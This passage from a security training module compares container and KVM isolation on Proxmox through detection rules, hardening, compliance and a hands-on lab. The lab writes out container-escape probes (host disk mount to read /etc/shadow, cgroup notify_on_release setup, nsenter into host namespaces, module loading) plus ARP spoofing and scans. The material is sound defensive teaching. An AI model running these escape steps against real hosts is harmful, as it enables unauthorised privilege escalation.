  <rule id="100102" level="10">
    <if_group>syscheck</if_group>
    <match>/etc/pve/qemu-server|/etc/pve/lxc</match>
    <description>VM or container configuration file modified</description>
    <group>vm_security,config_change,</group>
  </rule>

  <!-- Detect LXC privilege escalation attempts -->
  <rule id="100103" level="14">
    <if_group>syslog</if_group>
    <match>lxc|container</match>
    <match>cap_sys_admin|cap_sys_ptrace|cap_sys_module|nsenter|unshare</match>
    <description>Potential LXC container escape — privilege escalation indicator</description>
    <group>container_escape,critical,</group>
  </rule>

  <!-- File integrity on Proxmox critical paths -->
  <rule id="100104" level="12">
    <if_group>syscheck</if_group>
    <match>/usr/bin/qemu-system|/usr/bin/lxc-|/usr/sbin/pve</match>
    <description>Critical Proxmox binary modified — possible compromise</description>
    <group>vm_security,integrity,critical,</group>
  </rule>

  <!-- Detect covert channel indicators -->
  <rule id="100105" level="8">
    <if_group>audit</if_group>
    <match>perf_event_open|rdtsc|rdtscp</match>
    <description>Performance counter or timestamp access — possible side-channel</description>
    <group>vm_security,side_channel,</group>
  </rule>

</group>
```

**Wazuh agent configuration for Proxmox hosts (`/var/ossec/etc/ossec.conf` excerpt):**

```xml
<ossec_config>
  <syscheck>
    <!-- Monitor Proxmox configuration files -->
    <directories check_all="yes" realtime="yes">/etc/pve</directories>
    <directories check_all="yes" realtime="yes">/etc/pve/firewall</directories>
    <directories check_all="yes">/usr/bin/qemu-system-x86_64</directories>
    <directories check_all="yes">/usr/sbin/pvedaemon</directories>
    <directories check_all="yes">/usr/sbin/pveproxy</directories>

    <!-- Monitor container configurations -->
    <directories check_all="yes" realtime="yes">/etc/pve/lxc</directories>
    <directories check_all="yes" realtime="yes">/etc/pve/qemu-server</directories>
  </syscheck>

  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/pveproxy/access.log</location>
  </localfile>

  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/pve-firewall.log</location>
  </localfile>
</ossec_config>
```

### 8.4 Network Monitoring in Hybrid — East-West Traffic

East-west traffic between containers and VMs on the same host or across hosts requires monitoring at multiple layers:

```bash
# Proxmox: Enable firewall logging for inter-VLAN traffic
# /etc/pve/firewall/cluster.fw
[RULES]
# Log all traffic between container VLAN and VM VLAN
IN ACCEPT -source 10.10.20.0/24 -dest 10.10.30.0/24 -log info
IN ACCEPT -source 10.10.30.0/24 -dest 10.10.20.0/24 -log info

# For deep packet inspection, mirror traffic to a monitoring VM:
# On the Proxmox host, create a mirror port on the OVS bridge
ovs-vsctl -- set Bridge vmbr1 mirrors=@m \
  -- --id=@p get Port vmbr1-tap200 \
  -- --id=@q get Port vmbr1-tap100 \
  -- --id=@mon get Port vmbr1-tapMONITOR \
  -- --id=@m create Mirror name=east-west-mirror \
     select-dst-port=@p,@q select-src-port=@p,@q \
     output-port=@mon
```

For Kubernetes pods, use a CNI that supports network flow logging (Cilium with Hubble, Calico with flow logs) to capture pod-to-pod and pod-to-VM traffic metadata.

### 8.5 Vulnerability Scanning — Containers and VMs

**Container vulnerability scanning with Trivy:**

```bash
# Scan container image for CVEs
trivy image --severity HIGH,CRITICAL registry.internal/app:v1.2.3

# Scan running containers
trivy k8s --report summary cluster

# Scan Kubernetes manifests for misconfigurations
trivy config --severity HIGH,CRITICAL /path/to/manifests/

# Generate SBOM for compliance
trivy image --format spdx-json --output sbom.json registry.internal/app:v1.2.3
```

**VM vulnerability scanning with OpenVAS/Greenbone (Nessus alternative — open source):**

```bash
# Deploy OpenVAS scanner in a dedicated VM
# Configure scan targets — VM IPs on management VLAN
# Schedule authenticated scans with SSH credentials
# Proxmox host scan — check for missing kernel patches, open ports,
# misconfigured services

# For Proxmox host specifically, also check:
# - Kernel version against known CVEs
# - QEMU version against known CVEs
# - OpenSSL version
# - pveproxy/pvedaemon version
proxmox-version-check() {
  echo "Kernel: $(uname -r)"
  echo "QEMU: $(qemu-system-x86_64 --version | head -1)"
  echo "PVE: $(pveversion)"
  echo "OpenSSL: $(openssl version)"
}
```

---

## 9. Compliance Considerations

### 9.1 PCI-DSS for Containers vs VMs — Scope Differences

PCI-DSS scoping for virtualized environments differs fundamentally based on the isolation model:

**VM-based scoping:**
- Each VM can be individually scoped — a VM not handling cardholder data can be out of scope if network segmentation prevents access
- The hypervisor is always in scope (it has access to all VM memory)
- VM-to-VM isolation is considered sufficient for segmentation (with proper network controls)

**Container-based scoping:**
- The shared kernel means **all containers on the same host are in scope** if any container handles cardholder data
- Container network segmentation (network namespaces, CNI policies) is generally not considered sufficient for PCI-DSS scope reduction without additional validation
- The host OS is always in scope
- The container runtime (Docker, containerd) is in scope
- Image registries and build pipelines are in scope (supply chain)

| PCI-DSS Requirement | VM Implementation | Container Implementation |
|---------------------|-------------------|--------------------------|
| Req 2.2 — System hardening | Per-VM hardening, separate OS | Host + runtime + image hardening |
| Req 6.3 — Vulnerability management | Per-VM patching | Image rebuild + redeploy |
| Req 10.2 — Audit logging | Per-VM audit logs | Centralized + per-container logs |
| Req 11.2 — Vulnerability scanning | Per-VM network scan | Image scan + runtime scan |
| Segmentation validation | VM network boundaries accepted | Shared kernel = shared scope |

### 9.2 Container-Specific Compliance — CIS Benchmarks

**CIS Docker Benchmark v1.6.0 — key controls:**

```bash
# 1.1.1 — Ensure Docker is up to date
docker version

# 2.1 — Restrict network traffic between containers
# Add to /etc/docker/daemon.json:
# { "icc": false }   ← disables inter-container communication by default

# 4.1 — Ensure image is created for non-root user
# Dockerfile must include: USER <non-root-user>

# 4.5 — Ensure Content Trust is enabled
export DOCKER_CONTENT_TRUST=1

# 5.2 — Do not use --privileged
# Audit: docker inspect --format '{{.HostConfig.Privileged}}' <container>

# 5.3 — Do not mount sensitive host directories
# Audit: docker inspect --format '{{.Mounts}}' <container>

# 5.10 — Ensure memory usage is limited
# docker run --memory 512m --memory-swap 512m ...

# 5.25 — Ensure container is restricted from acquiring new privileges
# docker run --security-opt no-new-privileges ...

# 5.28 — Ensure PID cgroup limit is set
# docker run --pids-limit 100 ...
```

**CIS Kubernetes Benchmark v1.9.0 — critical controls:**

```bash
# 1.2.6 — Ensure the API server --authorization-mode is not set to AlwaysAllow
# Check: ps -ef | grep kube-apiserver | grep authorization-mode

# 1.2.16 — Ensure admission control PodSecurity is set
# kube-apiserver --enable-admission-plugins=...,PodSecurity,...

# 4.2.1 — Ensure kubelet --anonymous-auth is false
# kubelet --anonymous-auth=false

# 5.1.6 — Ensure namespace aware network policies
# Verify: kubectl get networkpolicy -A
```

### 9.3 VM-Specific Compliance — CIS Proxmox

While no official CIS Proxmox Benchmark exists (as of this writing), the CIS Debian benchmark applies to the Proxmox host OS, and the following Proxmox-specific controls should be implemented:

```bash
# Authentication hardening
pveum realm modify pam --tfa type=totp   # Enforce 2FA
pveum acl modify / --users admin@pam --roles PVEAdmin  # Least-privilege RBAC

# API token scoping
pveum user token add admin@pam automation --privsep 1
pveum acl modify /vms/100 --tokens admin@pam!automation --roles PVEVMUser

# TLS hardening for pveproxy
cat > /etc/default/pveproxy <<'PROXY_CONF'
ALLOW_FROM="10.10.10.0/24"
DENY_FROM="all"
POLICY="deny"
CIPHERS="ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
HONOR_CIPHER_ORDER="yes"
PROXY_CONF

# Disable unnecessary services
systemctl disable --now rpcbind.service rpcbind.socket
systemctl disable --now spiceproxy.service  # If not using SPICE

# Kernel hardening via sysctl
cat > /etc/sysctl.d/99-proxmox-hardening.conf <<'SYSCTL'
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.perf_event_paranoid = 3
kernel.unprivileged_bpf_disabled = 1
net.core.bpf_jit_harden = 2
kernel.yama.ptrace_scope = 2
kernel.unprivileged_userns_clone = 0
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
SYSCTL
sysctl --system
```

### 9.4 Shared Kernel Compliance Implications

The shared kernel creates cascading compliance implications:

1. **Patch management**: A kernel CVE requires patching the host, which affects all containers. The patching window is larger (more workloads affected) and the risk of regression is higher.
2. **Audit logging**: Kernel audit logs (auditd) capture events from all containers. Separating audit trails per container requires log correlation by container ID — not native to auditd.
3. **Access control**: Root in the host kernel = root over all containers. There is no compartmentalization at the kernel level — unlike VMs where hypervisor RBAC separates guest management.
4. **Vulnerability scope**: A kernel vulnerability places all containers in the vulnerability scope simultaneously, regardless of whether they are individually patched.

### 9.5 Immutable Infrastructure and Compliance

Immutable infrastructure — where workloads are replaced rather than patched in place — aligns well with compliance:

```
Mutable (traditional VM):
  Deploy → Patch → Patch → Patch → ... → Drift → Unknown state

Immutable (container/microVM):
  Build verified image → Deploy → Replace with new verified image → ...
  Each deployment is a known-good state
```

Benefits for compliance:
- **Reproducibility**: Every deployment is built from a versioned, scanned image
- **Audit trail**: Image build logs provide complete provenance (FROM base → COPY app → built by CI)
- **Drift detection**: Any runtime modification is an anomaly (read-only root filesystem)
- **Rollback**: Previous known-good image is always available

This applies to both containers (Docker images) and VMs (Packer/cloud-init images). The key compliance advantage is that the deployed artifact matches the scanned artifact — no configuration drift between scan and production.

---

## 10. Lab: Hybrid Security Assessment

### 10.1 Lab Topology

```
┌─────────────────────────────────────────────────────────────────┐
│  Proxmox Host (pve-lab.internal, 10.10.0.10)                     │
│                                                                   │
│  vmbr0 (Management, VLAN 10, 10.10.10.0/24)                     │
│  vmbr1 (Container VLAN 20, 10.10.20.0/24)                       │
│  vmbr2 (VM VLAN 30, 10.10.30.0/24)                              │
│                                                                   │
│  ┌──────────────────────┐  ┌──────────────────────┐             │
│  │ LXC 200 (unpriv)     │  │ LXC 201 (privileged) │             │
│  │ Debian 12, web server │  │ Debian 12, test target│             │
│  │ 10.10.20.10 (VLAN 20)│  │ 10.10.20.11 (VLAN 20)│             │
│  └──────────────────────┘  └──────────────────────┘             │
│                                                                   │
│  ┌──────────────────────┐  ┌──────────────────────┐             │
│  │ KVM VM 100 (hardened)│  │ KVM VM 101 (monitor) │             │
│  │ Debian 12, DB server │  │ Wazuh + Falco        │             │
│  │ 10.10.30.10 (VLAN 30)│  │ 10.10.10.20 (VLAN 10)│             │
│  └──────────────────────┘  └──────────────────────┘             │
└─────────────────────────────────────────────────────────────────┘
```

### 10.2 Lab Exercise 1 — Deploy Proxmox with Both LXC and KVM Workloads

```bash
# Step 1: Create hardened unprivileged LXC container
pct create 200 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \
  --hostname lxc-web \
  --unprivileged 1 \
  --cores 2 --memory 1024 --swap 0 \
  --rootfs local-zfs:4 \
  --net0 name=eth0,bridge=vmbr1,firewall=1,tag=20,ip=10.10.20.10/24,gw=10.10.20.1 \
  --features nesting=0,fuse=0,keyctl=0

# Step 2: Create privileged LXC container (for testing escapes)
pct create 201 local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \
  --hostname lxc-test \
  --unprivileged 0 \
  --cores 2 --memory 1024 --swap 0 \
  --rootfs local-zfs:4 \
  --net0 name=eth0,bridge=vmbr1,firewall=1,tag=20,ip=10.10.20.11/24,gw=10.10.20.1 \
  --features nesting=1

# Step 3: Create hardened KVM VM
qm create 100 \
  --name kvm-db \
  --bios ovmf \
  --efidisk0 local-zfs:0,efitype=4m,pre-enrolled-keys=1 \
  --machine q35 \
  --cpu host,flags=+spec-ctrl+ssbd+md-clear \
  --cores 4 --memory 4096 --balloon 0 \
  --scsi0 local-zfs:32,ssd=1,discard=on,iothread=1 \
  --scsihw virtio-scsi-single \
  --net0 virtio,bridge=vmbr2,firewall=1,tag=30 \
  --tpmstate0 local-zfs:4,version=v2.0 \
  --vga none --tablet 0 \
  --serial0 socket \
  --cdrom local:iso/debian-12.x-amd64-netinst.iso \
  --boot order=scsi0

# Step 4: Create monitoring VM
qm create 101 \
  --name monitor \
  --bios ovmf \
  --efidisk0 local-zfs:0,efitype=4m \
  --machine q35 \
  --cpu host \
  --cores 4 --memory 8192 --balloon 0 \
  --scsi0 local-zfs:64,ssd=1,discard=on,iothread=1 \
  --scsihw virtio-scsi-single \
  --net0 virtio,bridge=vmbr0,firewall=1,tag=10 \
  --vga none --tablet 0 \
  --serial0 socket \
  --cdrom local:iso/debian-12.x-amd64-netinst.iso

# Step 5: Configure firewall rules
cat > /etc/pve/firewall/200.fw <<'FW'
[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
macfilter: 1
ipfilter: 1

[RULES]
IN ACCEPT -p tcp -dport 80
IN ACCEPT -p tcp -dport 443
IN ACCEPT -source 10.10.10.0/24 -p tcp -dport 22
IN DROP -log warning
FW

cat > /etc/pve/firewall/100.fw <<'FW'
[OPTIONS]
enable: 1
policy_in: DROP
policy_out: ACCEPT
macfilter: 1

[RULES]
IN ACCEPT -source 10.10.20.0/24 -p tcp -dport 5432
IN ACCEPT -source 10.10.10.0/24 -p tcp -dport 22
IN DROP -log err
FW

# Step 6: Start all workloads
pct start 200 && pct start 201
qm start 100 && qm start 101
```

### 10.3 Lab Exercise 2 — Attempt Container Escape from LXC

```bash
# Connect to the privileged LXC container (201)
pct enter 201

# --- Inside privileged LXC 201 ---

# Test 1: Enumerate capabilities
capsh --print
# Expected: Full capability set (privileged container)

# Test 2: Mount host filesystem via /dev
cat /proc/partitions
# Look for host disks (sda, nvme0n1, etc.)
mkdir /escape
mount /dev/sda2 /escape 2>/dev/null
# If successful: can read host filesystem
ls /escape/etc/shadow 2>/dev/null && echo "ESCAPE: Host filesystem accessible"

# Test 3: cgroup escape (notify_on_release technique)
# Note: This may be blocked by Proxmox AppArmor profile
# even in privileged containers
mkdir /tmp/cgrp 2>/dev/null
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
mkdir /tmp/cgrp/x 2>/dev/null
echo 1 > /tmp/cgrp/x/notify_on_release 2>/dev/null
if [ $? -eq 0 ]; then
  echo "VULNERABLE: cgroup escape possible"
else
  echo "BLOCKED: cgroup notify_on_release denied"
fi

# Test 4: Attempt nsenter to host namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash 2>/dev/null
if [ $? -eq 0 ]; then
  echo "ESCAPE: nsenter to host namespace succeeded"
else
  echo "BLOCKED: nsenter denied"
fi

# Test 5: Attempt kernel module loading
insmod /tmp/test.ko 2>/dev/null
if [ $? -eq 0 ]; then
  echo "VULNERABLE: Kernel module loading possible"
else
  echo "BLOCKED: Module loading denied (expected)"
fi

# --- Now connect to the unprivileged LXC container (200) ---
# Exit 201 first, then:
pct enter 200

# Repeat the same tests — all should fail in unprivileged container:
capsh --print  # Minimal capabilities
mount /dev/sda2 /escape 2>/dev/null  # Permission denied
nsenter --target 1 --mount -- /bin/bash 2>/dev/null  # Permission denied
# UID inside is 0 but maps to 100000+ on host — cannot access host resources
id  # uid=0(root) — but this is mapped to unprivileged host UID
cat /proc/self/uid_map  # Shows the UID mapping
```

### 10.4 Lab Exercise 3 — Compare with KVM Isolation

```bash
# Connect to the KVM VM (100) via serial console
qm terminal 100

# --- Inside KVM VM 100 ---

# Test 1: Enumerate — separate kernel
uname -r  # VM's own kernel, not host kernel

# Test 2: No host devices visible
lsblk  # Only VM's virtual disks (sda, vda)
# No host disks visible — hardware-enforced isolation

# Test 3: No host processes visible
ps aux  # Only VM processes
# PID 1 is the VM's init, not the host's

# Test 4: Cannot access host memory
# The VM has its own address space enforced by EPT/NPT
# There is no /proc/1/root pointing to host filesystem
# There is no Docker socket, no cgroup filesystem from host

# Test 5: Kernel exploit inside VM
# Even if we exploit a kernel vulnerability inside the VM,
# we gain root inside the VM — not on the host
# VM escape requires a separate QEMU/KVM exploit

# Test 6: Check vTPM
tpm2_getcap properties-fixed  # vTPM 2.0 operational
tpm2_pcrread sha256:0,1,2,3,4,5,6,7  # PCR measurements from measured boot
```

### 10.5 Lab Exercise 4 — Implement Security Controls

```bash
# On the Proxmox host:

# 1. Apply custom seccomp profile to LXC 200
cat > /var/lib/lxc/200/seccomp.conf <<'SECCOMP'
2
blacklist
[all]
kexec_load errno 1
kexec_file_load errno 1
init_module errno 1
finit_module errno 1
delete_module errno 1
mount errno 1
umount2 errno 1
pivot_root errno 1
swapon errno 1
swapoff errno 1
reboot errno 1
settimeofday errno 1
clock_settime errno 1
stime errno 1
acct errno 1
personality errno 1
setns errno 1
unshare errno 1
SECCOMP

# Update LXC config to use custom seccomp
pct set 200 --mp0 /var/lib/lxc/200/seccomp.conf,mp=/seccomp.conf
# Actually set in /etc/pve/lxc/200.conf:
# lxc.seccomp.profile = /var/lib/lxc/200/seccomp.conf

# 2. Apply custom AppArmor profile for LXC 200
cat > /etc/apparmor.d/lxc/lxc-web-200 <<'APPARMOR'
#include <tunables/global>

profile lxc-web-200 flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/lxc/container-base>

  # Deny network raw sockets
  deny network raw,
  deny network packet,

  # Deny mount operations
  deny mount,
  deny umount,
  deny pivot_root,

  # Deny ptrace
  deny ptrace,

  # Deny access to sensitive proc entries
  deny /proc/sys/kernel/** w,
  deny /proc/sysrq-trigger rwklx,
  deny /proc/kcore rwklx,
  deny /sys/firmware/** rwklx,
  deny /sys/kernel/security/** rwklx,
  deny /sys/kernel/debug/** rwklx,

  # Deny capability escalation
  deny capability sys_admin,
  deny capability sys_module,
  deny capability sys_rawio,
  deny capability sys_ptrace,
  deny capability net_admin,
}
APPARMOR

apparmor_parser -r /etc/apparmor.d/lxc/lxc-web-200
# Set in LXC config: lxc.apparmor.profile = lxc-web-200

# 3. Harden KVM VM 100 — disable unused devices
qm set 100 --vga none       # No display
qm set 100 --tablet 0       # No USB tablet
qm set 100 --audio0 none    # No audio (if set)
# Already using: machine=q35, virtio-scsi, OVMF (no legacy BIOS devices)

# 4. Apply Proxmox host kernel hardening
cat > /etc/sysctl.d/99-lab-hardening.conf <<'SYSCTL'
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.perf_event_paranoid = 3
kernel.unprivileged_bpf_disabled = 1
kernel.unprivileged_userns_clone = 0
kernel.yama.ptrace_scope = 2
net.core.bpf_jit_harden = 2
SYSCTL
sysctl --system
```

### 10.6 Lab Exercise 5 — Test Cross-Boundary Attacks

```bash
# Test 1: Can LXC 200 (VLAN 20) reach KVM 100 (VLAN 30)?
pct enter 200
ping 10.10.30.10  # Should be blocked by firewall (no VLAN 20→30 rule)
nc -zv 10.10.30.10 5432  # Should be blocked

# Test 2: Can LXC 201 (privileged, VLAN 20) reach KVM 100 (VLAN 30)?
pct enter 201
ping 10.10.30.10  # Also blocked — firewall is per-interface, not per-privilege

# Test 3: ARP spoofing from LXC (macfilter/ipfilter test)
pct enter 201
apt install -y arping 2>/dev/null
arping -U -c 3 -I eth0 10.10.20.1 2>/dev/null
# macfilter should prevent MAC spoofing
# ipfilter should prevent IP spoofing

# Test 4: From KVM VM, scan the container VLAN
# (Requires explicit firewall rule allowing VLAN 30→20)
qm terminal 100
nmap -sS 10.10.20.0/24  # Should show filtered/closed — firewall blocks
```

### 10.7 Lab Exercise 6 — Compare Detection Capabilities

```bash
# On the monitoring VM (101), install and configure Falco + Wazuh

# --- Falco (on Proxmox host, monitoring containers) ---
# Install Falco with eBPF driver (no kernel module needed)
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
  gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
  https://download.falco.org/packages/deb stable main" | \
  tee /etc/apt/sources.list.d/falcosecurity.list
apt update && apt install -y falco
# Configure Falco to use eBPF
falcoctl driver install --type ebpf
systemctl enable --now falco

# Deploy the container security rules from Section 8.2
cp container-security.yaml /etc/falco/rules.d/
systemctl restart falco

# --- Wazuh Agent (on Proxmox host) ---
curl -sO https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.x_amd64.deb
WAZUH_MANAGER='10.10.10.20' dpkg -i wazuh-agent_4.x_amd64.deb
systemctl enable --now wazuh-agent

# --- Trigger test events ---
# From privileged LXC 201, trigger escape attempt:
pct enter 201
mount -t proc proc /mnt 2>/dev/null  # Should trigger Falco alert

# Check Falco logs
journalctl -u falco --since "5 minutes ago" | grep -i "mount\|escape"

# Check Wazuh alerts (on manager VM 101)
# ssh to 10.10.10.20 and check:
cat /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.id == "100103")'
```

### 10.8 Lab Exercise 7 — Document Security Posture Differences

Complete this assessment table based on your lab findings:

| Test | LXC Unprivileged (200) | LXC Privileged (201) | KVM VM (100) |
|------|------------------------|----------------------|--------------|
| Host filesystem access | Blocked (UID mapping) | Possible if not AppArmor'd | Impossible (EPT boundary) |
| Host process visibility | Blocked (PID ns) | Blocked (PID ns) | Impossible (separate kernel) |
| Kernel exploit impact | Host compromise | Host compromise | Guest-only compromise |
| Device access | Blocked (device cgroup) | Partial access | Impossible (IOMMU) |
| Network spoofing | Blocked (macfilter) | Blocked (macfilter) | Isolated (separate NIC) |
| Module loading | Blocked (seccomp+caps) | Depends on config | N/A (separate kernel) |
| cgroup manipulation | Blocked (ns+caps) | Possible without AppArmor | N/A (separate cgroup tree) |
| nsenter escape | Blocked (user ns) | Depends on config | N/A (no host namespaces) |
| Falco detection | Yes (syscall monitoring) | Yes (syscall monitoring) | No (in-guest agent needed) |
| Wazuh detection | Via host agent | Via host agent | Via in-guest agent |
| Recovery after compromise | Rebuild container | Rebuild container | Restore VM snapshot |
| Forensics capability | Limited (shared kernel) | Limited (shared kernel) | Full (memory dump, disk image) |

**Key finding:** Unprivileged LXC with AppArmor and seccomp approaches VM-level security for many practical scenarios, but the shared kernel remains the fundamental weakness. A kernel zero-day affects all containers regardless of privilege level, namespace configuration, or MAC policy. KVM VMs are immune to this class of attack by design.

**Recommendation for hybrid Proxmox deployments:**
- **KVM VMs** for: databases with sensitive data, multi-tenant workloads, compliance-scoped applications, Windows guests, workloads requiring hardware passthrough, and any workload exposed to untrusted input directly
- **LXC containers (unprivileged, hardened)** for: internal microservices, build systems, development environments, utility services (DNS, NTP, monitoring agents), and workloads where density matters and the trust boundary is the organization

---

## References

- Linux kernel namespaces documentation: `Documentation/admin-guide/namespaces/`
- OCI Runtime Specification: https://github.com/opencontainers/runtime-spec
- Docker default seccomp profile: https://github.com/moby/moby/blob/master/profiles/seccomp/default.json
- Firecracker design documentation: https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md
- gVisor architecture: https://gvisor.dev/docs/architecture_guide/
- Kata Containers architecture: https://github.com/kata-containers/kata-containers/tree/main/docs/design
- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes
- Falco rules reference: https://falco.org/docs/reference/rules/
- Wazuh ruleset documentation: https://documentation.wazuh.com/current/user-manual/ruleset/
- AMD SEV-SNP specification: https://www.amd.com/en/developer/sev.html
- Intel TDX specification: https://www.intel.com/content/www/us/en/developer/tools/trust-domain-extensions/overview.html
- CVE-2019-5736 (runc escape): https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- CVE-2022-0847 (Dirty Pipe): https://nvd.nist.gov/vuln/detail/CVE-2022-0847
- CVE-2024-21626 (Leaky Vessels): https://nvd.nist.gov/vuln/detail/CVE-2024-21626
- Proxmox VE Administration Guide: https://pve.proxmox.com/pve-docs/
- Module 20 — Hypervisor Security Hardening (this curriculum)
- Module 21 — VM Escape Attacks & Defenses (this curriculum)
- Module 22 — Network Segmentation and Virtual Firewalls (this curriculum)
